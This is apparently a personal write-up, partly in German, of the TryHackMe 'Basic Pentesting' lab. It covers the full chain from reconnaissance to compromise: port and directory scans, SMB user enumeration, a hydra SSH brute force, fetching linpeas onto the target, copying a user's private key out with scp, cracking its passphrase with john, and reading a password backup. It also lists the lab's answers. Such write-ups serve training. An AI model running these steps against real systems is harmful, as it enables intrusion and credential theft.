<html>
	<head>
		<title>Basic Pentesting</title>
		<link rel="stylesheet" href="styles.css">
	</head>
	<h1>Tryhackme.com - Basic Pentesting</h1>
	<h3>Author: Uwe HÃ¶rber Datum: 09.12.2020</h3>


	<h1>the tasks</h1>

	<h3> Task 1 </h3>
<br>
	Deploy the machine and connect to our network
	<h3> Task 2 </h3>
<br>
	Find the services exposed by the machine

<br>
	nmap -sV -sC -oA nmap/initial {IP der box}

	<p>
<br>
	Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-09 09:47 EST
<br>
	Nmap scan report for localhost (10.10.168.140)
<br>
	Host is up (0.044s latency).
<br>
	Not shown: 994 closed ports
<br>
	PORT     STATE SERVICE     VERSION
<br>
	22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
<br>
	| ssh-hostkey: 
<br>
	|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
<br>
	|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
<br>
	|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
<br>
	80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
<br>
	|_http-server-header: Apache/2.4.18 (Ubuntu)
<br>
	|_http-title: Site doesn't have a title (text/html).
<br>
	139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
<br>
	445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
<br>
	8009/tcp open  ajp13?
<br>
	|_ajp-methods: Failed to get a valid response for the OPTION request
<br>
	8080/tcp open  http-proxy
<br>
	|_http-favicon: Apache Tomcat
<br>
	|_http-title: Apache Tomcat
	</p>

	<h3> Task 3 </h3>
<br>
	What is the name of the hidden directory on the web server(enter name without /)?

<br>
	gobuster dir -u http://10.10.168.140 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
	<p>
<br>
	/development (Status: 301)
	</p>
<br>
	
<br>
	Antwort: development

	<h3> Task 4 </h3>
<br>
	User brute-forcing to find the username and password

<br>
	gobuster dir -u http://10.10.168.140:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

	<p>
<br>
	===============================================================
<br>
	Gobuster v3.0.1
<br>
	by OJ Reeves (@TheColonial) and Christian Mehlmauer (@_FireFart_)
<br>
	===============================================================
<br>
	[+] Url:            http://10.10.168.140:8080
<br>
	[+] Threads:        10
<br>
	[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<br>
	[+] Status codes:   200,204,301,302,307,401,403
<br>
	[+] User Agent:     gobuster/3.0.1
<br>
	[+] Timeout:        10s
<br>
	===============================================================
<br>
	2020/12/09 10:07:05 Starting gobuster
<br>
	===============================================================
<br>
	/docs (Status: 302)
<br>
	/examples (Status: 302)
<br>
	/manager (Status: 302)

	</p>

<br>
	manager fragt nach credentials...

<br>
	mit burp intercept schau ich mal in den request

<br>
	payload ist wohl als header mitgeschickt.

<br>
	Header name: Authentication
<br>
	Content: Basic {user:pass b64 encodiert}	

<br>
	damit jetzt loszurennen macht fuer mich keinen Sinn, weil ich weder Benutzer noch Passwort weis.

<br>
	ich starte jetzt erstmal enum4linux.

	<h3> Task 5 </h3>
<br>
	What is the username?

<br>
	enum4linux ergibt zwei user: jan, kay
<br>
	
<br>
	Antwort: jan

	<h3> Task 6 </h3>
<br>
	What is the password?

<br>
	hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.251.200

	<p>
<br>
		Hydra v9.1 (c) 2020 by van Hauser/THC and David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

<br>
	Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-12-09 11:09:24
<br>
	[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
<br>
	[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
<br>
	[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
<br>
	[DATA] attacking ssh://10.10.251.200:22/
<br>
	[STATUS] 184.00 tries/min, 184 tries in 00:01h, 14344223 to do in 1299:18h, 16 active

<br>
	[STATUS] 126.33 tries/min, 379 tries in 00:03h, 14344028 to do in 1892:22h, 16 active
<br>
	[22][ssh] host: 10.10.251.200   login: jan   password: armando
<br>
	1 of 1 target successfully completed, 1 valid password found
<br>
	[WARNING] Writing restore file because 9 final worker threads did not complete until end.
<br>
	[ERROR] 9 targets did not resolve or could not be connected
<br>
	[ERROR] 0 target did not complete
<br>
	Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-12-09 11:16:10
	</p>

<br>
	Antwort: armando
	<h3> Task 7 </h3>
<br>
	What service do you use to access the server(answer in abbreviation in all caps)?

<br>
	Antwort: SSH
	<h3> Task 8 </h3>
<br>
	Enumerate the machine to find any vectors for privilege escalation

<br>
	upload linpeas

<br>
	python simple http server und wget auf target machine nachdem wir uns mit den bekannten login credentials eingeloggt haben

<br>
	chmod +x auf linpeas.sh und ausfuehren

<br>
	linpeas.sh &gt; linpeas_result

<br>
	scp linpeas_result kali@{meine ip}:/home/kali/thm/basicpentesting/

<br>
	die Datei kommt jetzt hier als bytes an und muss noch kodiert werden.

<br>
	iconv -t UTF-8 linpeas_result -o linpeas_result_utf8

	<p>
<br>
	[+] Searching ssl/ssh files                                                                                                                                                                                                                
<br>
	Port 22                                                                                                                                                                                                                                    
<br>
	PermitRootLogin prohibit-password                                                                                                                                                                                                          
<br>
	PubkeyAuthentication yes                                                                                                                                                                                                                   
<br>
	PermitEmptyPasswords no                                                                                                                                                                                                                    
<br>
	ChallengeResponseAuthentication no                                                                                   
<br>
	UsePAM yes                                                                                                                                                                                                                                 
<br>
	Possible private SSH keys were found!                                                                                                                                                                                                      
<br>
	/home/kay/.ssh/id_rsa                                                                                                                                                                                                                      
<br>
	 --&gt; /etc/hosts.allow file found, read the rules:                                                                                                                                                                                          
<br>
	 /etc/hosts.allow                                                                                                     


<br>
	 Searching inside /etc/ssh/ssh_config for interesting info
<br>
	 Host *
<br>
	 SendEnv LANG LC_*
<br>
	 HashKnownHosts yes
<br>
	 GSSAPIAuthentication yes
<br>
	 GSSAPIDelegateCredentials no

	</p>

<br>
	scp /home/kay/.ssh/id_rsa kali@{meine ip}:/home/kali/thm/basicpentesting/
<br>
	
<br>
	mit dem private key des users kay einloggen

	<h3> Task 9 </h3>
<br>
	What is the name of the other user you found(all lower case)?
<br>
	
<br>
	Antwort: kay

	<h3> Task 10  </h3>
<br>
	If you have found another user, what can you do with this information?

	<h3> Task 11 </h3>
<br>
	What is the final password you obtain?

<br>
	okay, wir haben einen private key von kay. Wenn ich versuche mich damit einzuloggen, werde ich nach einem passphrase gefragt.

<br>
	wir koennen john the ripper nutzen um diesen passphrase zu erfahren.

<br>
	dafuer nutzen wir zuerst das tool ssh2john (ich hab mir dazu das git repo geklont)

<br>
	/opt/john/run/ssh2john.py id_rsa &gt; forJohn
<br>
	
<br>
	john forJohn --wordlist=/usr/share/wordlists/rockyou.txt

	<p>
<br>
	Using default input encoding: UTF-8
<br>
	Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
<br>
	Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
<br>
	Cost 2 (iteration count) is 1 for all loaded hashes
<br>
	Will run 2 OpenMP threads
<br>
	Note: This format may emit false positives, so it will keep trying even after
<br>
	finding a possible candidate.
<br>
	Press 'q' or Ctrl-C to abort, almost any other key for status
<br>
	beeswax          (id_rsa)
<br>
	1g 0:00:00:02 43.26% (ETA: 03:52:08) 0.3355g/s 2116Kp/s 2116Kc/s 2116KC/s lazygurl04..lazygirl11
<br>
	Session aborted
	</p>

<br>
	ssh -i id_rsa kay@{IP der box}
<br>
	pw ist beeswax

<br>
	und wir sind eingeloggt!

<br>
	cat pass.bak

<br>
	Antwort: heresareallystrongpasswordthatfollowsthepasswordpolicy$$
</html>
